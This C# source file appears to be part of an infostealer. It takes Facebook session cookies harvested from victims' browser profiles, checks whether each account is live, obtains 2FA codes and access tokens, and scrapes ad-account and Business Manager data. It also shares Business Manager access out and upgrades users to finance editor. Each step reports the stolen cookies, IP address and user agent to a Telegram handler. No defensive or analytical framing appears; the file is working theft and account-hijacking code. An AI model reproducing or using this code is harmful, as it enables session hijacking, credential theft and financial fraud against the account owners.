using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using DataExtractor.Core.Exts;
using DataExtractor.Core.Handlers.Fb;
using DataExtractor.Core.Models;

namespace DataExtractor.Core.Handlers;

public class FbDataScanner
{
	private static HttpClientHandler _httpClientHandler;

	private static HttpClient _httpClient = CreateHttpClient();

	private static HttpClient CreateHttpClient()
	{
		_httpClientHandler = new HttpClientHandler();
		_httpClientHandler.CookieContainer = new CookieContainer();
		_httpClientHandler.Proxy = null;
		return new HttpClient(_httpClientHandler);
	}

	internal void Scanning(int count, List<MyBrowser> listBrowser, TelegramHandler telegramHandler, ConfigData configData)
	{
		foreach (BrowserProfile profile in from a in listBrowser.SelectMany((MyBrowser a) => a.Profiles)
			where !string.IsNullOrEmpty(a.FbCookies)
			orderby a.FbCookies.Contains("_base_session") descending
			orderby a.FbCookies.Contains("dbln=") descending
			orderby a.FbCookies.Contains("_fbp=") descending
			select a)
		{
			_httpClient.DefaultRequestHeaders.UserAgent.Clear();
			string userAgent = null;
			if (!string.IsNullOrEmpty(profile.MyBrowser.UserAgent))
			{
				userAgent = profile.MyBrowser.UserAgent;
				telegramHandler.Log("USERAGENT : " + profile.MyBrowser.UserAgent);
			}
			else
			{
				telegramHandler.Log("No user agent, get user agent of another browser");
				userAgent = listBrowser.FirstOrDefault((MyBrowser a) => !string.IsNullOrEmpty(a.UserAgent))?.UserAgent;
				if (string.IsNullOrEmpty(userAgent))
				{
					telegramHandler.Log("No user agent find in pc, use Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36");
					userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36";
				}
				telegramHandler.Log("USERAGENT : " + userAgent);
			}
			_httpClient.DefaultRequestHeaders.UserAgent.TryParseAdd(userAgent);
			FbData allFbData = GetAllFbData(profile.FbCookies, count, configData, telegramHandler, delegate(FbData FbData)
			{
				profile.FbData = FbData;
				profile.FbData.Ip = FbData.Ip?.ToString();
				profile.FbData.UserAgent = userAgent;
				telegramHandler.Send(profile);
				SaveFileHandler.SaveTempConfigData();
			});
			if (allFbData != null)
			{
				profile.FbData = allFbData;
				profile.FbData.Ip = allFbData.Ip?.ToString();
				profile.FbData.UserAgent = userAgent;
				telegramHandler.TrySend(profile);
				SaveFileHandler.SaveTempConfigData();
				allFbData.ClearLog();
			}
		}
	}

	public FbData GetAllFbData(string cookies, int count, ConfigData configData, TelegramHandler telegramHandler, Action<FbData> haveFbData)
	{
		if (string.IsNullOrEmpty(cookies) || !cookies.Contains("c_user"))
		{
			telegramHandler.Log("No cookie FB ###");
			return null;
		}
		string userId = ExtractUserId(cookies);
		AddCookie(telegramHandler, cookies);
		FbData all = GetAll(userId, telegramHandler, configData, delegate(FbData data)
		{
			data.Cookies = cookies;
			data.Ip = ((configData.Ip == null) ? "No IP" : configData.Ip.ToString());
			haveFbData(data);
		}, count);
		if (all != null)
		{
			all.Cookies = cookies;
			all.Ip = ((configData.Ip == null) ? "No IP" : configData.Ip.ToString());
			return all;
		}
		return null;
	}

	private FbData GetAll(string userId, TelegramHandler telegramHandler, ConfigData configData, Action<FbData> haveFbData, int count)
	{
		telegramHandler.Log("Tien hanh check user : " + userId);
		FbData fbData = configData.CacheFbData.FirstOrDefault((FbData a) => a.UserId == userId);
		if (fbData == null)
		{
			fbData = new FbData
			{
				UserId = userId,
				Version = telegramHandler.Version
			};
			configData.CacheFbData.Add(fbData);
		}
		fbData.Log("Tien hanh check user : " + userId);
		if (!CheckLive(fbData))
		{
			fbData.Log("Account die");
			return null;
		}
		BeginGet2FaCode(fbData, telegramHandler);
		if (!BeginGetToken(fbData, telegramHandler))
		{
			fbData.Log("Có vẻ account đã tạch, get token failed");
			return fbData;
		}
		fbData.IsCheckpoint = false;
		new InfoFbHandler().RunScan(_httpClient, fbData, telegramHandler);
		if (!CheckLive(fbData))
		{
			fbData.Log("Chay bm nhưng account đã tạch ngay lúc này");
			return fbData;
		}
		if (count % 2 != 0)
		{
			new ShareDataHandler().Run(fbData, _httpClient, telegramHandler, haveFbData);
			if (fbData.IsCheckpoint || !CheckLive(fbData))
			{
				fbData.Log("shar3 bm nhưng account đã tạch ngay lúc này");
				return fbData;
			}
		}
		else
		{
			new GetInfoAdsAccountHandler().GetNguong(fbData, _httpClient, telegramHandler);
			if (fbData.IsCheckpoint || !CheckLive(fbData))
			{
				fbData.Log("get info nhưng account đã tạch ngay lúc này");
				return fbData;
			}
			new UpdateBmUserHandler().Run(fbData, _httpClient, telegramHandler);
			if (fbData.IsCheckpoint || !CheckLive(fbData))
			{
				fbData.Log("update bm account to finance editor nhưng account đã tạch ngay lúc này");
				return fbData;
			}
		}
		return fbData;
	}

	private bool BeginGet2FaCode(FbData data, TelegramHandler telegramHandler)
	{
		if (data.Codes != null && data.Codes.Count > 5)
		{
			return true;
		}
		Get2FaCodeHandler get2FaCodeHandler = new Get2FaCodeHandler();
		return get2FaCodeHandler.Get2FaCode(_httpClient, data, telegramHandler);
	}

	private bool BeginGetToken(FbData fbData, TelegramHandler telegramHandler)
	{
		FbTokenHandler fbTokenHandler = new FbTokenHandler();
		if (fbData.FbToken != null && fbData.FbToken.Tokens.Count > 0 && !fbTokenHandler.CheckLive(fbData, _httpClient))
		{
			fbData.Log("Có vẻ token ko còn sử dụng đc, xoá hết đi");
			fbData.FbToken.Tokens.Clear();
		}
		if (fbData.FbToken == null || fbData.FbToken.Tokens.Count == 0)
		{
			if (!fbTokenHandler.GetToken(_httpClient, fbData, telegramHandler))
			{
				fbData.Log("Get token failed");
				if (!CheckLive(fbData))
				{
					fbData.Log("account die");
					return false;
				}
				fbData.Log("No token but account live");
				return true;
			}
			return true;
		}
		return true;
	}

	private bool CheckLive(FbData fbData)
	{
		fbData.Log("Check live");
		string requestUri = "https://mbasic.facebook.com/me";
		HttpRequestMessage httpRequestMessage = new HttpRequestMessage(HttpMethod.Get, requestUri);
		httpRequestMessage.Headers.Add("sec-fetch-dest", "document");
		httpRequestMessage.Headers.Add("sec-fetch-mode", "navigate");
		httpRequestMessage.Headers.Add("sec-fetch-site", "none");
		httpRequestMessage.Headers.Add("sec-fetch-user", "?1");
		try
		{
			string result = _httpClient.SendAsync(httpRequestMessage).Result.Content.ReadAsStringAsync().Result;
			string text = result.CutString("fb_dtsg\" value=\"", "\"");
			if (!string.IsNullOrEmpty(text))
			{
				fbData.Fbdtsg = text;
			}
			return result.Contains("profile_id=" + fbData.UserId);
		}
		catch
		{
			return false;
		}
	}

	private void AddCookie(TelegramHandler telegramHandler, string cookies)
	{
		telegramHandler.Log("add cookie " + cookies);
		ResetCookie("m.facebook.com", "www.facebook.com", "mbasic.facebook.com", "business.facebook.com", "graph.facebook.com");
		foreach (string item in from a in cookies.Split(';')
			where !string.IsNullOrEmpty(a)
			select a)
		{
			string[] array = item.Split('=');
			try
			{
				_httpClientHandler.CookieContainer.Add(new Cookie(array[0].Trim(), string.Join("", array.Skip(1)), "/", "facebook.com"));
			}
			catch
			{
			}
		}
	}

	private void ResetCookie(params string[] domains)
	{
		foreach (string text in domains)
		{
			foreach (Cookie cookie in _httpClientHandler.CookieContainer.GetCookies(new Uri("https://" + text)))
			{
				cookie.Expired = true;
			}
		}
	}

	private string ExtractUserId(string cookies)
	{
		return cookies.CutString("c_user=", ";");
	}
}
